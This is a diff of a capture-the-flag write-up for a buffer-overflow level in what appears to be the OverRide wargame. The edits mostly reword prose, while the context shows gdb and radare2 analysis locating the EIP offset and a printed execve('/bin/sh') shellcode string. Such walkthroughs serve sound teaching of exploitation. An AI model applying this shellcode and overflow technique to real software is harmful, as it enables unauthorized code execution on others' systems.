@@ -1,8 +1,7 @@
 # Level 01 Buffer Overflow
 
 ## Overview
-The binary is a basic login program that asks for `username` and `password`.
-There are 2 `fgets()` functions with buffers of size `256` and `100` in the program, that suggest the possibility of a **buffer overflow** vulnerability. For *flow redirection* to a *shellcode* execution. 
+The binary is a basic login program that prompts for a `username` and `password`. It contains two `fgets()` functions with buffers of size `256` and `100`, suggesting potential **buffer overflow** vulnerabilities that could lead to *flow redirection* and *shellcode* execution.
 
 ### Main Function
 ```bash
@@ -15,8 +14,8 @@ There are 2 `fgets()` functions with buffers of size `256` and `100` in the prog
 ```
 ![R2 graph](../docs/media/l1.r2.png)
 
-### Verify User Name
-The username verification happens with a **7 characters** comparison with the name `"dat_wil"`, that disables the possibility of the *buffer overflow* attack on this `fgets()` function.
+### Verify Username
+The username comparison involves checking the first 7 characters against `"dat_wil"`, preventing a buffer overflow attack on this `fgets()` function.
 ```bash
 [...]
 [0x080484d0]> s sym.verify_user_name
@@ -26,7 +25,7 @@ The username verification happens with a **7 characters** comparison with the na
 ![R2 Verify Username](../docs/media/l1.verify_username.png)
 
 ### `fgets` Buffer Sizes
-As we can see with `ltrace`, the buffer sizes of the 2 `fgets()` are 256 and 100 characters, on the addresses `0x0804a040` and `0xffffd6ec` respectively.
+Using `ltrace`, the buffer sizes of the 2 `fgets()` are 256 and 100 characters, on the addresses `0x0804a040` and `0xffffd6ec` respectively.
 We can try to find out if the stack frame size available after the second `fgets()` call, is inside the size of the buffer, to see if we can overwrite the `EIP` address to redirect the flow.
 ```
 level01@OverRide:~$ ltrace ./level01 
@@ -49,7 +48,7 @@ puts("nope, incorrect password...\n"nope, incorrect password...
 +++ exited (status 1) +++
 ```
 
-### Find EIP offset
+### Finding EIP Offset
 #### `gdb` Disassembled Main
 ```gdb
 (gdb) disassemble main 
@@ -93,7 +92,7 @@ Dump of assembler code for function main:
    0x080485b5 <+229>:	ret    
 End of assembler dump.
 ```
-#### Breakpoint after password `fgets`
+#### Breakpoint after Password `fgets`
 ```
 (gdb) break *0x08048579                                     # break after fgets password
 Breakpoint 1 at 0x8048579
@@ -162,7 +161,7 @@ execve("/bin/sh", NULL, NULL) =
 "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
 ```
 
-### Result
+## Result
 
 This one line command is able to run a shell as a level02 user.
 ```bash
